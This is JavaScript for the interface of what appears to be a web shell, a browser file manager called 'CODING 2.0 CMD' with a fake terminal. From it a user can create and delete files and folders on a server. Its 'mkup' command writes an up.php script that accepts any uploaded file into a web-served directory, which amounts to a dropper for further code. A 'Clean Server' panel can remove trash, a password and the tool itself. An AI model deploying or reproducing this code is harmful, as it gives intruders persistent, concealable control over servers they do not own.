        var cmdLayer = document.getElementById('cmd-layer');
        var cmdNotifyTemplate = document.getElementById('cmd-notify-template');
        var cmdNotifyLayer = document.getElementById('cmd-notify-layer');
        function normalizeUrlCmd(u){
            if (!u) return '';
            var url = u.trim();
            if (/^https?:\/\//i.test(url)) return url;
            return 'https://' + url;
        }
        function spawnCmdWindow(){
            if (!cmdTemplate || !cmdLayer) return null;
            var win = cmdTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdLayer.appendChild(win);
            // Restore saved position or center once
            try {
                var savedLeft = parseInt(localStorage.getItem('cmd.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('cmd.top') || '', 10);
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var cw = win.offsetWidth || 720;
                    var ch = win.offsetHeight || 520;
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var cw2 = win.offsetWidth || 720;
                    var ch2 = win.offsetHeight || 520;
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw2 - 6, Math.round((window.innerWidth - cw2) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch2 - 6, Math.round((window.innerHeight - ch2) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            try { localStorage.setItem('app.cmd.open', '1'); } catch(e){}

            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-output');
            var input = win.querySelector('.cmd-input');
            var inputRow = win.querySelector('.cmd-input-row');

            function print(line, cls){
                var div = document.createElement('div');
                if (cls) div.className = cls;
                div.textContent = line;
                output.appendChild(div);
                output.scrollTop = output.scrollHeight;
            }
            function help(){
                print('Available commands:', 'sys');
                print('  help            Show this help', 'sys');
                print('  echo <text>    Print text', 'sys');
                print('  date           Show current date/time', 'sys');
                print('  clear          Clear the screen', 'sys');
                print('  sum a b        Add two numbers', 'sys');
                print('  open <url|q>   Open URL or search in new tab', 'sys');
                print('  mkdir <name>   Create a folder in current directory', 'sys');
                print('  mkfile <name.ext> Create a file in current directory', 'sys');
                print('  mkup           Create up.php upload script in current directory', 'sys');
                print('  rm <name.ext>  Delete a file in current directory', 'sys');
                print('  rmdir <name>   Delete a folder (recursive) in current directory', 'sys');
            }
            function getRelCurrent(){
                try {
                    var p = new URLSearchParams(window.location.search);
                    var d = p.get('d');
                    return d ? d : '';
                } catch(e){ return ''; }
            }
            async function refreshListing(){
                try {
                    var rel = getRelCurrent();
                    var url = window.location.pathname + (rel ? ('?d=' + encodeURIComponent(rel)) : '');
                    var resp = await fetch(url, { credentials:'same-origin' });
                    var html = await resp.text();
                    var doc = new DOMParser().parseFromString(html, 'text/html');
                    var newBody = doc.querySelector('#files-body');
                    var curBody = document.querySelector('#files-body');
                    if (newBody && curBody) {
                        curBody.innerHTML = newBody.innerHTML;
                    }
                } catch(e) {
                    // ignore
                }
            }
            function process(cmdline){
                var s = (cmdline || '').trim();
                if (!s) return;
                print('$ ' + s);
                var parts = s.split(/\s+/);
                var cmd = parts[0].toLowerCase();
                var args = parts.slice(1);
                try {
                    if (cmd === 'help') { help(); return; }
                    if (cmd === 'echo') { print(args.join(' ')); return; }
                    if (cmd === 'date') { print(new Date().toLocaleString(), 'ok'); return; }
                    if (cmd === 'clear') { output.innerHTML = ''; return; }
                    if (cmd === 'sum') {
                        var a = parseFloat(args[0] || '0');
                        var b = parseFloat(args[1] || '0');
                        if (isNaN(a) || isNaN(b)) { print('sum: numbers required', 'err'); }
                        else { print(String(a + b), 'ok'); }
                        return;
                    }
                    if (cmd === 'open') {
                        var raw = args.join(' ');
                        if (!raw) { print('open: url or query required', 'err'); return; }
                        var looksLikeUrl = /^https?:\/\//i.test(raw) || /^[\w-]+\.[\w.-]+/.test(raw);
                        var url = looksLikeUrl ? normalizeUrlCmd(raw) : ('https://www.google.com/search?q=' + encodeURIComponent(raw));
                        try { window.open(url, '_blank', 'noopener'); } catch(e){}
                        print('Opened: ' + url, 'ok');
                        return;
                    }
                    if (cmd === 'mkdir') {
                        var name = (args[0] || '').trim();
                        if (!name) { print('mkdir: folder name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(name)) { print('mkdir: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel = getRelCurrent();
                        var body = 'api=mkdir&dir=' + encodeURIComponent(rel) + '&name=' + encodeURIComponent(name);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body })
                            .then(function(r){ return r.json().catch(function(){ return { success:false, error:'Invalid response' }; }); })
                            .then(function(j){ if (j && j.success) { print('OK: created folder "' + name + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create folder'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'mkfile') {
                        var fname = (args[0] || '').trim();
                        if (!fname) { print('mkfile: file name required', 'err'); return; }
                        if (fname.indexOf('.') === -1) { print('mkfile: must include extension (e.g. index.html)', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(fname)) { print('mkfile: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel2 = getRelCurrent();
                        var body2 = 'api=mkfile&dir=' + encodeURIComponent(rel2) + '&name=' + encodeURIComponent(fname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body2 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: created file "' + fname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create file'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'rm') {
                        var delname = (args[0] || '').trim();
                        if (!delname) { print('rm: file name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(delname)) { print('rm: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var relDel = getRelCurrent();
                        var bodyDel = 'api=rm&dir=' + encodeURIComponent(relDel) + '&name=' + encodeURIComponent(delname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: bodyDel })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: deleted "' + delname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to delete'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'mkup') {
                        var rel3 = getRelCurrent();
                        var fname3 = 'up.php';
                        var tpl = '<' + '?php\n' +
                            'if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {\n' +
                            '    if (isset($_FILES[\'file\'])) {\n' +
                            '        $f = $_FILES[\'file\'];\n' +
                            '        if ($f[\'error\'] === UPLOAD_ERR_OK) {\n' +
                            '            $name = basename((string)$f[\'name\']);\n' +
                            '            $dest = __DIR__ . DIRECTORY_SEPARATOR . $name;\n' +
                            '            if (move_uploaded_file((string)$f[\'tmp_name\'], $dest)) {\n' +
                            '                echo \'<p>Uploaded: \' . htmlspecialchars($name, ENT_QUOTES) . \'</p>\';\n' +
                            '            } else {\n' +
                            '                echo \'<p>Failed to move uploaded file.</p>\';\n' +
                            '            }\n' +
                            '        } else {\n' +
                            '            echo \'<p>Upload error code: \' . (int)$f[\'error\'] . \'</p>\';\n' +
                            '        }\n' +
                            '    }\n' +
                            '}\n' +
                            '?' + '>\n' +
                            '<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Upload File</title></head><body>\n' +
                            '<h1>Upload a File</h1>\n' +
                            '<form method=\"post\" enctype=\"multipart/form-data\">\n' +
                            '  <input type=\"file\" name=\"file\" required>\n' +
                            '  <button type=\"submit\">Upload</button>\n' +
                            '</form>\n' +
                            '</body></html>\n';
                        var body3 = 'api=mkfile&dir=' + encodeURIComponent(rel3) + '&name=' + encodeURIComponent(fname3) + '&content=' + encodeURIComponent(tpl);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body3 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: created upload script "' + fname3 + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create file'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'rmdir') {
                        var dname = (args[0] || '').trim();
                        if (!dname) { print('rmdir: folder name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(dname)) { print('rmdir: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel4 = getRelCurrent();
                        var body4 = 'api=rmdir&dir=' + encodeURIComponent(rel4) + '&name=' + encodeURIComponent(dname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body4 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: deleted folder "' + dname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to delete folder'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    print('Command not found: ' + cmd, 'err');
                } catch(e){ print('error: ' + (e && e.message ? e.message : String(e)), 'err'); }
            }

            // Intro
            print('CODING 2.0 CMD — type "help" for commands', 'sys');

            // Hide traditional input row; use live typing inside output
            if (inputRow) inputRow.style.display = 'none';
            var live = document.createElement('div');
            live.className = 'cmd-live';
            live.innerHTML = '<span class="cmd-prompt">$</span> <span class="cmd-typed"></span><span class="cmd-cursor"></span>';
            output.appendChild(live);
            var typedSpan = live.querySelector('.cmd-typed');
            var typedBuffer = '';

            // Focus window to capture keystrokes
            win.setAttribute('tabindex', '0');
            try { win.focus(); } catch(e){}
            output.addEventListener('click', function(){ try { win.focus(); } catch(e){} });
            titlebar && titlebar.addEventListener('click', function(){ try { win.focus(); } catch(e){} });

            function handleKey(e){
                // Allow basic typing, backspace, and enter
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (typedBuffer.trim()) {
                        print('$ ' + typedBuffer);
                        process(typedBuffer);
                        typedBuffer = '';
                        typedSpan.textContent = '';
                    }
                    return;
                }
                if (e.key === 'Backspace') {
                    e.preventDefault();
                    if (typedBuffer.length > 0) {
                        typedBuffer = typedBuffer.slice(0, -1);
                        typedSpan.textContent = typedBuffer;
                    }
                    return;
                }
                // Ignore control keys
                if (e.ctrlKey || e.metaKey || e.altKey) return;
                if (e.key.length === 1) {
                    // Regular printable character
                    typedBuffer += e.key;
                    typedSpan.textContent = typedBuffer;
                    e.preventDefault();
                }
            }
            win.addEventListener('keydown', handleKey);

            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){
                drag.active = true;
                var rect = win.getBoundingClientRect();
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('cmd.left', String(Math.round(rect.left)));
                    localStorage.setItem('cmd.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);

            // Close
            closeBtn && closeBtn.addEventListener('click', function(){
                win.removeEventListener('keydown', handleKey);
                win.remove();
                try { localStorage.setItem('app.cmd.open', '0'); } catch(e){}
            });

            // Traditional input disabled in favor of live typing; keep no-op

            return win;
        }
        cmdTrigger && cmdTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnCmdWindow(); });

        // CMD-style notification popup
        function spawnCmdNotify(message, isError){
            if (!cmdNotifyTemplate || !cmdNotifyLayer) return null;
            var win = cmdNotifyTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdNotifyLayer.appendChild(win);
            // Center
            try {
                var cw = win.offsetWidth || 560;
                var ch = win.offsetHeight || 220;
                var left = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw) / 2)));
                var top = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-notify-output');
            function print(line, cls){ var div = document.createElement('div'); if (cls) div.className = cls; div.textContent = line; output.appendChild(div); }
            // Compose message lines
            print('CODING 2.0 CMD', 'sys');
            if (isError) { print('ERROR: ' + message, 'err'); }
            else { print('OK: ' + message, 'ok'); }
            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){ drag.active = false; document.removeEventListener('mousemove', onMouseMove); document.removeEventListener('mouseup', onMouseUp); }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            // Close
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Auto-close after a short delay
            setTimeout(function(){ try { win.remove(); } catch(e){} }, 5000);
            try { window.spawnCmdNotify = spawnCmdNotify; } catch(e){}
            return win;
        }
        // On-load: show any server-side errors as red CMD-style popups
        try {
            var pageErrors = document.querySelectorAll('.error');
            if (pageErrors && pageErrors.length) {
                Array.prototype.forEach.call(pageErrors, function(errNode){
                    try {
                        var raw = (errNode.textContent || '').trim();
                        var msg = raw.replace(/^\s*error\s*/i, '').trim();
                        if (!msg) msg = 'Operation failed';
                        if (typeof spawnCmdNotify === 'function') spawnCmdNotify(msg, true);
                    } catch(e){}
                });
            }
        } catch(e){}

        // Trash popup: list files deleted in last 1 hour (persistent + auto-refresh)
        async function spawnTrashWindow(){
            if (!cmdNotifyTemplate || !cmdNotifyLayer) return null;
            // If already open, return the existing window
            try {
                if (window.trashWin && document.body.contains(window.trashWin)) {
                    return window.trashWin;
                }
            } catch(e){}
            var win = cmdNotifyTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdNotifyLayer.appendChild(win);
            // Restore saved position or center
            try {
                var savedLeft = parseInt(localStorage.getItem('trash.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('trash.top') || '', 10);
                var cw = win.offsetWidth || 560;
                var ch = win.offsetHeight || 260;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-notify-output');
            function print(line, cls){ var div = document.createElement('div'); if (cls) div.className = cls; div.textContent = line; output.appendChild(div); }
            function clearTrashItems(){ try { Array.prototype.slice.call(output.querySelectorAll('.trash-item')).forEach(function(n){ n.remove(); }); } catch(e){} }
            function renderTrashItems(items){
                clearTrashItems();
                if (!items || !items.length){
                    // Show a soft hint beneath header if nothing
                    var hint = document.createElement('div');
                    hint.className = 'sys trash-item';
                    hint.textContent = 'No items deleted in the last hour';
                    output.appendChild(hint);
                    return;
                }
                for (var i=0;i<items.length;i++){
                    var it = items[i];
                    var name = it && it.name ? it.name : '';
                    var type = it && it.type ? it.type : 'file';
                    if (!name) continue;
                    var div = document.createElement('div');
                    div.className = 'ok trash-item';
                    div.textContent = 'trash ' + type + ' "' + name + '"';
                    output.appendChild(div);
                }
            }
            // Header lines
            print('CODING 2.0 CMD', 'sys');
            print('$ trash --last 1h');
            // Persist open state
            try { localStorage.setItem('app.trash.open', '1'); } catch(e){}
            // Initial fetch and render
            async function refreshTrash(){
                try {
                    var resp = await fetch('?api=trash_recent', { credentials:'same-origin' });
                    var data = await resp.json();
                    var items = (data && data.items) ? data.items : [];
                    renderTrashItems(items);
                } catch(err) {
                    // Show error only once; subsequent refreshes keep silent to avoid spam
                    if (!output.querySelector('.err')) print('ERROR: unable to load trash', 'err');
                }
            }
            await refreshTrash();
            var refreshTimer = setInterval(refreshTrash, 5000);
            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('trash.left', String(Math.round(rect.left)));
                    localStorage.setItem('trash.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            // Close only on click (no auto-dismiss)
            closeBtn && closeBtn.addEventListener('click', function(){
                try { clearInterval(refreshTimer); } catch(e){}
                try { localStorage.setItem('app.trash.open', '0'); } catch(e){}
                try { window.trashWin = null; } catch(e){}
                win.remove();
            });
            try { window.trashWin = win; } catch(e){}
            return win;
        }
        trashTrigger && trashTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnTrashWindow(); });

        // Clean OS popup: clear browser storage and clean server artifacts
        var cleanTrigger = document.getElementById('clean-trigger');
        var cleanTemplate = document.getElementById('clean-template');
        var cleanLayer = document.getElementById('clean-layer');
        async function spawnCleanWindow(){
            if (!cleanTemplate || !cleanLayer) return null;
            try { if (window.cleanWin && document.body.contains(window.cleanWin)) return window.cleanWin; } catch(e){}
            var win = cleanTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cleanLayer.appendChild(win);
            // Position center
            try {
                var cw = win.offsetWidth || 560; var ch = win.offsetHeight || 320;
                var left = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw)/2)));
                var top = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch)/2)));
                win.style.left = left + 'px'; win.style.top = top + 'px';
            } catch(e){}
            var titlebar = win.querySelector('.clean-titlebar');
            var closeBtn = win.querySelector('.clean-close');
            var result = win.querySelector('#clean-result');
            var btnBrowser = win.querySelector('#clean-browser');
            var btnServer = win.querySelector('#clean-server');
            var btnVerify = win.querySelector('#clean-verify-ok');
            var chkTrash = win.querySelector('#chk-trash');
            var chkPassword = win.querySelector('#chk-password');
            var chkSelf = win.querySelector('#chk-self');
            var inputConfirm = win.querySelector('#clean-confirm');
            function print(msg, cls){ var d=document.createElement('div'); if(cls) d.className=cls; d.textContent=msg; result.appendChild(d); }
            function clearResult(){ try { result.innerHTML = ''; } catch(e){} }
            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){ drag.active = false; document.removeEventListener('mousemove', onMouseMove); document.removeEventListener('mouseup', onMouseUp); }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            // Persist open state
            try { localStorage.setItem('app.clean.open', '1'); } catch(e){}
            // Clean Browser button: clear cookies, localStorage, sessionStorage, caches
            btnBrowser && btnBrowser.addEventListener('click', async function(){
                clearResult();
                try {
                    // Clear cookies (current domain)
                    var cookies = (document.cookie || '').split(';');
                    for (var i=0;i<cookies.length;i++){
                        var c = cookies[i].split('=')[0].trim();
                        if (!c) continue;
                        document.cookie = c + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
                    }
                    // Clear storages
                    try { localStorage.clear(); } catch(e){}
                    try { sessionStorage.clear(); } catch(e){}
                    // Clear caches if available
                    if (window.caches && typeof caches.keys === 'function'){
                        try {
                            var keys = await caches.keys();
                            for (var j=0;j<keys.length;j++){ try { await caches.delete(keys[j]); } catch(e){} }
                        } catch(e){}
                    }
                    print('Browser storage cleaned', 'ok');
                } catch(err) {
                    print('ERROR: failed to clean browser', 'err');
                }
            });
            // Clean Server button: send selected actions
            btnServer && btnServer.addEventListener('click', async function(){
                clearResult();
                var acts = [];
                if (chkTrash && chkTrash.checked) acts.push('trash');
                if (chkPassword && chkPassword.checked) acts.push('password');
                if (chkSelf && chkSelf.checked) acts.push('self');
                var payload = new URLSearchParams();
                payload.append('api','clean_server');
                payload.append('actions', acts.join(','));
                if (inputConfirm) payload.append('confirm', (inputConfirm.value || ''));
                try {
                    var resp = await fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: payload.toString(), credentials:'same-origin' });
                    var data = await resp.json();
                    var ok = !!(data && data.success);
                    var perf = (data && data.performed) ? data.performed : [];
                    var errs = (data && data.errors) ? data.errors : [];
                    if (ok) {
                        print('Server cleaned: ' + (perf.join(', ') || 'none'), 'ok');
                    } else {
                        print('ERROR: server clean failed: ' + (errs.join(', ') || 'unknown'), 'err');
                    }
                } catch(err) {
                    print('ERROR: request failed', 'err');
                }
            });
            btnVerify && btnVerify.addEventListener('click', function(){
                clearResult();
                print('Clean done ✓', 'ok');
            });
            closeBtn && closeBtn.addEventListener('click', function(){
                try { localStorage.setItem('app.clean.open', '0'); } catch(e){}
                try { window.cleanWin = null; } catch(e){}
                win.remove();
            });
            try { window.cleanWin = win; } catch(e){}
            return win;
        }
        cleanTrigger && cleanTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnCleanWindow(); });

        // Settings popup
        var settingsTrigger = document.getElementById('settings-trigger');
        var settingsTemplate = document.getElementById('settings-template');
        var settingsLayer = document.getElementById('settings-layer');
        function randomPassword(len){
            var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:,.<>?';
            var out = '';
            for (var i=0;i<len;i++){ out += chars[Math.floor(Math.random()*chars.length)]; }
            return out;
        }
        function spawnSettingsWindow(){
            if (!settingsTemplate || !settingsLayer) return null;
            var win = settingsTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            settingsLayer.appendChild(win);
            try { localStorage.setItem('app.settings.open', '1'); } catch(e){}
            // Terminal-style toast helper
            function showTermToast(msg, isError){
                try {
                    var t = document.createElement('div');
                    t.className = 'term-toast' + (isError ? ' error' : '');
                    t.innerHTML = '<span class="prompt">$</span><span class="msg"></span><span class="cursor">_</span>';
                    t.querySelector('.msg').textContent = msg;
                    document.body.appendChild(t);
                    // Force reflow for transition then show
                    void t.offsetWidth; t.classList.add('show');
                    setTimeout(function(){ t.classList.remove('show'); setTimeout(function(){ t.remove(); }, 200); }, 2600);
                } catch(e) {}
            }
            // Restore saved position or center window initially
            try {
                var savedLeft = parseInt(localStorage.getItem('settings.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('settings.top') || '', 10);
                var sw = win.offsetWidth || 560;
                var sh = win.offsetHeight || 320;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - sw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - sh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - sw - 6, Math.round((window.innerWidth - sw) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - sh - 6, Math.round((window.innerHeight - sh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            var titlebar = win.querySelector('.settings-titlebar');
            var closeBtn = win.querySelector('.settings-close');
            var inputCurrent = win.querySelector('#set-current');
            var inputNew = win.querySelector('#set-new');
            var inputConfirm = win.querySelector('#set-confirm');
            var btnGen = win.querySelector('#set-generate');
            var btnCopy = win.querySelector('#set-copy');
            var btnSave = win.querySelector('#set-save');
            var toggleCur = win.querySelector('#set-cur-toggle');
            var toggleNew = win.querySelector('#set-new-toggle');
            var toggleConf = win.querySelector('#set-conf-toggle');
            // Dragging
            var dragging = false, offX = 0, offY = 0;
            function onDown(e){ dragging = true; var r = win.getBoundingClientRect(); offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top; document.body.style.userSelect='none'; }
            function onMove(e){ if(!dragging) return; var left = (e.clientX||0) - offX; var top = (e.clientY||0) - offY; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left<8) left=8; if (top<8) top=8; if (left>maxLeft) left=maxLeft; if (top>maxTop) top=maxTop; win.style.left = left+'px'; win.style.top = top+'px'; }
            function onUp(){
                if(!dragging) return;
                dragging=false;
                document.body.style.userSelect='';
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('settings.left', String(Math.round(rect.left)));
                    localStorage.setItem('settings.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            document.addEventListener('mousemove', onMove);
            document.addEventListener('mouseup', onUp);
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try {
                    localStorage.setItem('app.settings.open', '0');
                } catch(e){}
            });
            btnGen && btnGen.addEventListener('click', function(){ var p = randomPassword(16); inputNew && (inputNew.value = p); inputConfirm && (inputConfirm.value = p); });
            btnCopy && btnCopy.addEventListener('click', function(){ var val = (inputNew && inputNew.value) || ''; if (!val) return; navigator.clipboard && navigator.clipboard.writeText(val).catch(function(){}); });
            btnSave && btnSave.addEventListener('click', function(){
                var curr = (inputCurrent && inputCurrent.value) || '';
                var neu = (inputNew && inputNew.value) || '';
                var conf = (inputConfirm && inputConfirm.value) || '';
                var body = 'api=set_password&current=' + encodeURIComponent(curr) + '&new=' + encodeURIComponent(neu) + '&confirm=' + encodeURIComponent(conf);
